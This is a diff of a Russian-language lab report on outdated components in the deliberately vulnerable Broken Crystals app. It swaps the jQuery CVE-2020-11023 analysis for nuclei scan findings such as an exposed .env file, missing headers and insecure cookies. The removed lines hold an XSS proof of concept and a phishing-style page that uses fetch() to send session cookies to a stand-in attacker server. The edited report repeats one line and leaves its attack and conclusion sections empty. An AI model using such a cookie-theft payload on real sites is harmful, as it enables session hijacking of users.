@@ -2,173 +2,47 @@
 
 ### Цель работы
 
-Выявить использование уязвимых или устаревших версий библиотек, фреймворков и других компонентов в веб-приложении. Проанализировать возможные векторы атак, связанные с известными уязвимостями (CVE) в используемых зависимостях, и оценить потенциальный риск эксплуатации таких компонентов для компрометации приложения или данных пользователей.
+Выявить использование уязвимых или устаревших версий библиотек, фреймворков и других компонентов в веб-приложении. Проанализировать векторы атак, связанные с известными уязвимостями.
 
 ## Ход выполнения
 
 ### 1) Разведка
 
-Для выявления используемых компонентов проанализировал исходный код главной страницы приложения:
+Для выявления используемых компонентов и потенциально уязвимых точек были применены различные автоматизированные инструменты анализа безопасности. В частности выполнен скан с использованием утилиты `nuclei`:
 
-```html
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description" content="Broken Crystals" />
+<img width="906" height="510" alt="изображение" src="https://github.com/user-attachments/assets/15e9a8e0-3969-48c5-8db4-76c0fc1196df" />
 
-    <!-- Favicons -->
-    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-icon-180x180.png" />
-    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-icon-192x192.png" />
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png" />
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png" />
-    <meta name="theme-color" content="#ffffff" />
 
-    <script id="config" type="application/json" src="/api/config"></script>
+В ходе сканирования были получены следующие результаты.
 
-    <!--
-      manifest.json provides metadata used when your web app is installed on a
-      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
-    -->
-    <link rel="manifest" href="/manifest.json" />
-    <title>Broken Crystals</title>
-    <!-- Google Fonts -->
-    <link
-      href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Roboto:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
-      rel="stylesheet"
-    />
+В ходе сканирования были получены следующие результаты.
 
-    <!-- Vendor CSS Files -->
-    <link href="/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
-    <link href="/assets/vendor/icofont/icofont.min.css" rel="stylesheet" />
-    <link href="/assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet" />
-    <link href="/assets/vendor/venobox/venobox.css" rel="stylesheet" />
-    <link href="/assets/vendor/aos/aos.css" rel="stylesheet" />
+**Технологии и компоненты**
+- **Веб-сервер:** Nginx
+- **SSL-сертификат:** Let's Encrypt
+- **Фронтенд:** Bootstrap, Animate.css, Google Font API
+- **DNS-хостинг:** AWS Route 53 (NS-записи)
+- **Почтовый сервис:** Google Apps (MX-записи)
 
-    <!-- Vendor CSS-->
-    <link href="/vendor/wow/animate.css" rel="stylesheet" media="all" />
-    <link href="/vendor/slick/slick.css" rel="stylesheet" media="all" />
+**Обнаруженные точки интереса**
+- `/graphql` — доступен GraphQL-эндпоинт
+- `/nginx.conf` — конфигурация веб-сервера Nginx
+- `/config.json` — конфигурационный файл приложения (Medium)
+- `/.env` — **CVE-2017-16894 (High)** - раскрытие файла с переменными окружения
 
-    <!-- Main CSS-->
-    <link href="/assets/css/style.css" rel="stylesheet" media="all" />
-    <link href="/css/theme.css" rel="stylesheet" media="all" />
-    <script type="module" crossorigin src="/assets/index-BgqCpeGa.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-Bm2fv7OY.css">
-  </head>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
+**Проблемы конфигурации безопасности**
+- отсутствует Content-Security-Policy
+- отсутствует X-Frame-Options
+- отсутствует X-Content-Type-Options
+- отсутствует Referrer-Policy
+- отсутствует Permissions-Policy
+- отсутствуют механизмы защиты междоменного взаимодействия
+- cookie `connect.sid` и `sid` установлены без флагов `Secure` и `HttpOnly`
+- cookie без атрибута `SameSite=Strict`
 
-    <!-- Vendor JS Files -->
-    <script src="/assets/vendor/jquery/jquery.min.js"></script>
-    <script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-    <script src="/assets/vendor/jquery.easing/jquery.easing.min.js"></script>
-    <script src="/assets/vendor/counterup/counterup.min.js"></script>
-    <script src="/assets/vendor/venobox/venobox.min.js"></script>
-    <script src="/assets/vendor/aos/aos.js"></script>
-
-    <!-- Vendor JS       -->
-    <script src="/vendor/slick/slick.min.js"></script>
-    <script src="/vendor/wow/wow.min.js"></script>
-    <script src="/vendor/counter-up/jquery.waypoints.min.js"></script>
-    <script src="/vendor/counter-up/jquery.counterup.min.js"></script>
-
-    <div id="root"></div>
-  </body>
-</html>
-```
-
-В коде страницы обнаружены ссылки на подключаемые JavaScript-библиотеки:
-
-```html
-<script src="/vendor/jquery/jquery.min.js"></script>
-<script src="/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-```
-
-Отправив запросы к серверу, выяснены версии библиотек:
-
-- `https://brokencrystals.com/assets/vendor/jquery/jquery.min.js` - **jQuery v3.4.1**
-
-- `https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.bundle.min.js` - **Bootstrap v4.4.1**
 
 ### 2) Атака
 
-Для проверки устаревших компонентов был проведен поиск известных CVE:
-
-- **jQuery 3.4.1** подвержена уязвимости **CVE-2020-11023**
-
-При передаче HTML-строки, содержащей элементы <option>, даже предварительно очищенный код может привести к выполнению непреднамеренного JavaScript. Уязвимость исправлена в jQuery 3.5.0. Злоумышленник может внедрить вредоносный код через пользовательский ввод, который затем обрабатывается уязвимыми методами jQuery. Успешная эксплуатация позволяет выполнить произвольный JavaScript.
-
 ### 3) Эксплуатация
 
-Для демонстрации уязвимости был создан локальный HTML-файл, подключающий ту же версию jQuery с сайта, и содержащий тестовый код, использующий уязвимый метод `.html()` для вставки `<option>`.
-
-```html
-<!DOCTYPE html>
-<html>
-<head>
-    <title>jQuery CVE-2020-11023 Demo</title>
-    <script src="https://brokencrystals.com/assets/vendor/jquery/jquery.min.js"></script>
-</head>
-<body>
-    <div id="target"></div>
-    
-    <script>
-        var maliciousHtml = '<option><script>alert("XSS через jQuery " + jQuery.fn.jquery)<\/script>';
-        
-        $('#target').html(maliciousHtml);
-    </script>
-</body>
-</html>
-```
-
-При открытии этой страницы в браузере jQuery обрабатывает переданную HTML-строку, и внедренный JavaScript-код выполняется, о чем свидетельствует всплывающее окно с версией jQuery:
-
-<img width="963" height="265" alt="изображение" src="https://github.com/user-attachments/assets/0cfccc90-bcc8-4aea-b22a-2df301688caa" />
-
-
-Также используя данную уязвимость можно, к примеру, похитить cookie сессии жертвы и отправить их на сервер злоумышленника:
-
-```html
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Поздравляем! Вы выиграли приз!</title>
-    <script src="https://brokencrystals.com/assets/vendor/jquery/jquery.min.js"></script>
-</head>
-<body>
-    <h1>🎉 Вы выиграли iPhone! 🎉</h1>
-    <p>Нажмите OK, чтобы получить приз...</p>
-    
-    <script>
-        // Вредоносный payload через уязвимый jQuery
-        var attackerServer = "https://attacker-server.com/steal";
-        var stolenCookies = document.cookie;
-        
-        var maliciousHtml = '<option><script>' +
-            'fetch("' + attackerServer + '?cookies=" + encodeURIComponent("' + stolenCookies + '"));' +
-            '<\/script>';
-        
-        $('#target').html(maliciousHtml);
-        
-        // Дополнительно: создаем невидимый элемент для атаки
-        $('body').append('<div id="target" style="display:none"></div>');
-    </script>
-</body>
-</html>
-```
-
-При открытии страницы происходит следующее:
-
-  1. Браузер загружает jQuery с `brokencrystals.com`
-  2. Уязвимый метод `.html()` обрабатывает вредоносный `<option>`
-  3. Выполняется JavaScript, который отправляет cookie текущей сессии на сервер злоумышленника
-  4. Злоумышленник получает cookie и может использовать их для захвата сессии
-
 ## Выводы о защищенности
-
-В результате анализа выявлено использование устаревшей версии библиотеки jQuery 3.4.1, которая подвержена критической уязвимости CVE-2020-11023. Данная уязвимость позволяет выполнить межсайтовый скриптинг (XSS) через методы манипуляции DOM, что было успешно продемонстрировано на практике. Использование уязвимых компонентов создает реальную угрозу компрометации пользовательских данных, включая кражу сессионных cookie и выполнение несанкционированных действий от имени жертвы.
-
-Проблема классифицируется как:
-- **CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')** - некорректная обработка входных данных при генерации веб-страницы
-- **CWE-1104: Use of Unmaintained Third Party Components** - использование неподдерживаемых сторонних компонентов с известными уязвимостями
